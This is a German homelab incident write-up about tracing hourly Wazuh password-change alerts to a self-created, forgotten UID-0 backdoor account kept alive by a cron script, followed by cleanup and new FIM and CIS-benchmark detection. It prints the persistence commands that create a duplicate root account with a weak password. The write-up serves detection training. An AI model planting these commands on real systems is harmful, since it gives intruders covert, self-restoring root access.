# Incident Write-up: Vergessener UID-0-Backdoor-Account

**Datum:** 17.10.2026
**Betroffenes System:** Ubuntu-Server-VM (`192.168.10.20`), Homelab
**Kategorie:** Detection & Incident Response
**MITRE ATT&CK:** [T1136.001 – Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)

## Zusammenfassung

Während eines Blue-Team-Workshops (Durchsicht von Wazuh-Alerts nach einer
vorangegangenen Penetration-Testing-Session) fiel eine wiederkehrende,
stündliche PAM-Meldung auf: `User changed password` für einen Account namens
`Mia`. Dieser Name tauchte in keiner mir bekannten Nutzerliste der auf dem
System laufenden Anwendungen auf. Die Untersuchung der rohen Log-Daten
(statt einer Vermutung) führte zur Entdeckung eines selbst angelegten,
zwischenzeitlich vergessenen **UID-0-Backdoor-Accounts** mit
Selbstheilungsmechanismus.

Dieses Dokument beschreibt den Untersuchungsweg, die Ursache, die Bereinigung
und die anschließend aufgebauten Erkennungsmechanismen — bewusst als
Incident-Write-up aufgebaut, nicht als reiner Exploit-Walkthrough.

## Zeitlicher Ablauf

| Zeit | Ereignis |
|---|---|
| ~12:45 (und stündlich wiederkehrend) | Wazuh protokolliert `PAM: User changed password` für `Mia` (Rule-ID 5555) |
| Entdeckung | Auffälligkeit beim Review der Wazuh-Alerts bemerkt — kein bekannter Account |
| Untersuchung | `agent.name`, `full_log` und `rule.id` des Events geprüft statt geraten |
| Root Cause | `/etc/passwd`-Eintrag zeigt `Mia:x:0:0::/home/Mia:/bin/sh` — UID **0** |
| Mechanismus | `/opt/scripts/cleanup.sh`, stündlich über `/etc/cron.hourly/` ausgeführt, legt Account neu an und setzt Passwort neu |
| Bereinigung | Scheduler deaktiviert, Account per `userdel -r` entfernt, Skript archiviert |
| Verifikation | `grep Mia /etc/passwd` leer; keine neuen Wazuh-Events mehr |
| Hardening | File Integrity Monitoring + CIS-Benchmark-Scan für genau diesen Fall eingerichtet |

## Untersuchung: Wie der Fund zustande kam

Der erste Reflex bei einem auffälligen Log-Eintrag ist oft, sofort zu
reagieren. Stattdessen wurden zuerst die rohen Felder des Wazuh-Events
geprüft, um Annahmen zu vermeiden:

```json
{
  "agent": { "name": "wazuhfalcon", "ip": "192.168.10.20", "id": "001" },
  "data": { "dstuser": "Mia" },
  "rule": {
    "id": "5555",
    "description": "PAM: User changed password.",
    "firedtimes": 11
  },
  "predecoder": {
    "program_name": "chpasswd",
    "timestamp": "Oct 17 12:45:01"
  },
  "full_log": "Oct 17 12:45:01 ubuntu-server chpasswd[7620]: pam_unix(chpasswd:chauthtok): password changed for Mia"
}
```

Zwei Details waren entscheidend:

1. **`program_name: chpasswd`** statt `passwd` — `chpasswd` ist ein
   Batch-Tool, das typischerweise von Skripten/Automatisierung genutzt wird,
   nicht interaktiv von einem Menschen.
2. **`firedtimes: 11`**, exakt stündlich — deutet auf einen wiederkehrenden,
   automatisierten Prozess hin, nicht auf ein einmaliges Ereignis.

Diese zwei Felder reichten, um die Suche gezielt auf geplante Tasks
(`crontab`, `/etc/cron.d/`, systemd-Timer) und auf den konkreten
Account `Mia` einzugrenzen, statt die ganze Maschine blind zu durchsuchen.

## Root Cause

```
# /etc/passwd
Mia:x:0:0::/home/Mia:/bin/sh
```

Das `passwd`-Format ist `username:x:UID:GID:...`. Eine **UID von `0`**
bedeutet volle root-Rechte — unabhängig vom Benutzernamen. Linux
unterscheidet Berechtigungen ausschließlich über die numerische UID, nicht
über den Namen. `Mia` war somit technisch ein zweiter, vollwertiger
root-Account.

Verantwortlich dafür war ein stündlich (über `/etc/cron.hourly/`)
ausgeführtes Skript:

```bash
# /opt/scripts/cleanup.sh
useradd -o -u 0 -g root Mia
echo "Mia:123456" | chpasswd
```

`useradd -o` erlaubt explizit doppelte UIDs (normalerweise verweigert). Die
stündliche Ausführung sorgte dafür, dass der Account samt Passwort auch dann
"geheilt" würde, wenn jemand ihn entfernt oder das Passwort ändert —
ein klassisches **Persistence-Pattern**.

## Bereinigung

```bash
# Scheduler deaktivieren
sudo chmod -x /etc/cron.hourly/<datei>   # oder löschen

# Backdoor-Account entfernen
sudo userdel -r Mia

# Skript archivieren/entfernen
sudo rm /opt/scripts/cleanup.sh

# Verifikation
grep Mia /etc/passwd   # kein Treffer mehr
```

## Nachgerüstete Erkennung

Der eigentliche Lerneffekt lag nicht im Finden allein, sondern darin,
dafür zu sorgen, dass ein vergleichbarer Fund künftig **automatisch**
auffällt statt durch Zufall beim manuellen Durchscrollen der Logs.

### 1. File Integrity Monitoring (FIM)

`syscheck`-Konfiguration um Realtime-Überwachung sicherheitsrelevanter
Dateien erweitert:

```xml
<directories check_all="yes" realtime="yes">
  /etc/passwd,/etc/shadow,/etc/sudoers,/etc/cron.d,/etc/cron.hourly,/opt/scripts
</directories>
```

**Verifiziert mit einem Live-Test:** erneutes Ausführen der gleichen Technik
(`useradd -o -u 0 -g root Testuser`) löste sofort einen FIM-Alert im
Wazuh-Dashboard aus, dank `realtime="yes"` praktisch ohne Verzögerung.

### 2. Security Configuration Assessment (CIS-Benchmark)

CIS-Benchmark-Scanning für Ubuntu aktiviert (`<sca>`-Block in `ossec.conf`,
Policy `cis_ubuntu22-04.yml`). Nach Scan-Lauf bestätigte **Check-ID 28740 —
"Ensure root is the only UID 0 account"** denselben Sachverhalt als
offiziellen, benannten Compliance-Check — unabhängig von der
PAM-Logzeile, die den ursprünglichen Fund ausgelöst hatte. Damit existiert
jetzt eine zweite, redundante Erkennungsschicht für genau dieses
Angriffsmuster.

## Lessons Learned

- **An Rohdaten orientieren, nicht an Vermutungen.** Agent-Name, `full_log`
  und `rule.id` lieferten in Minuten die Antwort, die reines Rätselraten
  nicht geliefert hätte.
- **UID 0 ≠ Benutzername "root".** Jeder Account mit UID 0 hat root-Rechte,
  unabhängig vom Namen — ein einfacher, aber wirkungsvoller
  Persistence-Mechanismus, der sich leicht übersieht, wenn man nur nach dem
  Namen "root" sucht.
- **Redundante Erkennung schlägt Einzelfund.** Die PAM-Logzeile allein hätte
  gereicht, um den Fall zu lösen — aber erst FIM (ereignisbasiert, sofort)
  und CIS-Benchmark (zustandsbasiert, periodisch) zusammen sorgen dafür,
  dass ein ähnlicher Fall auch dann auffällt, wenn eine der beiden
  Erkennungsschichten aus irgendeinem Grund ausfällt oder deaktiviert wird.
- **FIM meldet nur Änderungen, keine Bestandsaufnahme.** Direkt nach dem
  Einrichten "keine Ergebnisse" zu sehen ist normal — ein Alert kommt erst
  bei der nächsten tatsächlichen Änderung.
